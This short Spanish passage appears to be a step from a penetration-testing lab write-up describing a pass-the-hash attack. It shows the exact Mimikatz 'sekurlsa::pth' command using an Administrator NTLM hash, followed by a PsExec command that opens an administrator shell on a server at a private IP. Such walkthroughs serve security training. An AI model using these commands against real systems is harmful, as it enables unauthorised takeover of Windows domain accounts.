Pass the hash:
Este ataque permite usar los hashes obtenidos de los usuarios para iniciar sesión con alguno de ellos. En este caso se usará Mimikatz para iniciar sesión como Administrador usando su respectivo hash de contraseña.
Se ejecutará Mimikatz con el comando “.\mimikatz.exe” y se ingresará el comando “sekurlsa::pth /user:Administrador /domain:cs.org /ntlm:xxxxxxxxxxxxx”

Una vez se ejecute el comando anterior, se abrirá una consola CMD en la cual se usará la herramienta PsExec.exe para abrir una consola como administrador del servidor. Para ello previamente se debió de descargar la herramienta “PsExec” y luego usarlo de la siguiente forma: “PsExec.exe \\172.16.1.51 cmd.exe”


